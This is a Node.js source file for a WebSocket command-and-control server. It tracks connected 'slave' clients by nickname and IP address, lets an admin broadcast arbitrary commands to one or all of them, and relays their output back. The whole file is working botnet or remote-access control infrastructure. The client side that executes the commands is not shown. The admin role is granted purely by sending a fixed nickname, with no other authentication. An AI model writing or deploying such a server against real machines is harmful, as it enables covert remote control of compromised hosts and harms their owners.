const http = require("http");
const WebSocket = require("ws");

// === CONFIG ===
const PORT = process.env.PORT || 3000;
const ADMIN_LIST = ["Nonsense"];

// === STATE ===
const clients = new Map(); // Map<WebSocket, { nickname, isAdmin, ip }>
const pendingCommands = new Map(); // Map<slaveNickname, adminSocket>

// === HTTP SERVER ===
const server = http.createServer((_, res) => {
  res.writeHead(200, { "Content-Type": "text/plain" });
  res.end("WebSocket control server is running.");
});

// === WEBSOCKET SERVER ===
const wss = new WebSocket.Server({ server });

wss.on("connection", (ws, req) => {
  const ip = req.socket.remoteAddress?.replace(/^.*:/, "") || "unknown";
  console.log(`[+] New connection from IP: ${ip}`);
  ws.send("Please send your nickname:");

  let registered = false;

  ws.on("message", (raw) => {
    const text = raw.toString().trim();
    if (!text) return;

    if (!registered) return registerClient(ws, text, ip);

    const client = clients.get(ws);
    if (!client) return;

    const { nickname, isAdmin } = client;

    if (isAdmin) return handleAdminMessage(ws, nickname, text);
    return handleSlaveMessage(nickname, text);
  });

  ws.on("close", () => {
    const info = clients.get(ws);
    if (!info) return;
    const role = info.isAdmin ? "ADMIN" : "SLAVE";
    console.log(`[-] ${role} disconnected: ${info.nickname} (${info.ip})`);
    clients.delete(ws);
  });

  ws.on("error", (err) => {
    console.error(`[ERROR] WebSocket error: ${err.message}`);
  });
});

// === HANDLERS ===
function registerClient(ws, nickname, ip) {
  const trimmed = nickname.slice(0, 32);
  const isAdmin = ADMIN_LIST.includes(trimmed);
  clients.set(ws, { nickname: trimmed, isAdmin, ip });

  const role = isAdmin ? "ADMIN" : "SLAVE";
  console.log(`[+] ${role} connected: ${trimmed} (${ip})`);
  ws._nickname = trimmed; // helpful for easier mapping
  ws._registered = true;
}

function handleAdminMessage(ws, nickname, text) {
  if (text === "/slaves") {
    const list = Array.from(clients.values())
      .filter(c => !c.isAdmin)
      .map(c => `- ${c.nickname} (${c.ip})`)
      .join("\n") || "None";
    ws.send(`[INFO] Connected Slaves:\n${list}`);
    return;
  }

  if (text.startsWith("/command ")) {
    const [target, ...cmdParts] = text.slice(9).trim().split(" ");
    const command = cmdParts.join(" ");
    if (!target || !command) return ws.send("[ERROR] Usage: /command <slave|all> <command>");

    if (target === "all") {
      console.log(`[!] Admin ${nickname} sent to ALL: ${command}`);
      for (const [client, info] of clients.entries()) {
        if (!info.isAdmin && client.readyState === WebSocket.OPEN) {
          client.send(`[COMMAND]: ${command}`);
          pendingCommands.set(info.nickname, ws);
          setTimeout(() => checkTimeout(info.nickname, ws), 5000);
        }
      }
    } else {
      const slave = findClientByNickname(target);
      if (!slave || clients.get(slave).isAdmin || slave.readyState !== WebSocket.OPEN) {
        return ws.send(`[ERROR] Slave '${target}' not found or not connected.`);
      }
      console.log(`[!] Admin ${nickname} → ${target}: ${command}`);
      slave.send(`[COMMAND]: ${command}`);
      pendingCommands.set(target, ws);
      setTimeout(() => checkTimeout(target, ws), 5000);
    }
    return;
  }

  console.log(`[ADMIN] ${nickname}: ${text}`);
}

function handleSlaveMessage(nickname, text) {
  if (!text.startsWith("[OUTPUT]:") && !text.startsWith("[ERROR]:") && !text.startsWith("[EXCEPTION]:")) {
    return console.log(`[BLOCKED] Slave ${nickname} tried to send: ${text}`);
  }

  const adminSocket = pendingCommands.get(nickname);
  const response = `[${nickname}] ${text}`;
  if (adminSocket?.readyState === WebSocket.OPEN) {
    adminSocket.send(response);
  } else {
    broadcastToAdmins(response);
  }
  pendingCommands.delete(nickname);
}

// === UTILS ===
function findClientByNickname(name) {
  for (const [ws, info] of clients.entries()) {
    if (info.nickname === name) return ws;
  }
  return null;
}

function broadcastToAdmins(msg) {
  for (const [client, info] of clients.entries()) {
    if (info.isAdmin && client.readyState === WebSocket.OPEN) {
      client.send(msg);
    }
  }
}

function checkTimeout(slaveName, adminSocket) {
  if (pendingCommands.has(slaveName)) {
    if (adminSocket.readyState === WebSocket.OPEN) {
      adminSocket.send(`[TIMEOUT] No response from ${slaveName} after 5 seconds.`);
    }
    pendingCommands.delete(slaveName);
  }
}

// === START SERVER ===
server.listen(PORT, () => {
  console.log(`[*] Server listening on port ${PORT}`);
});
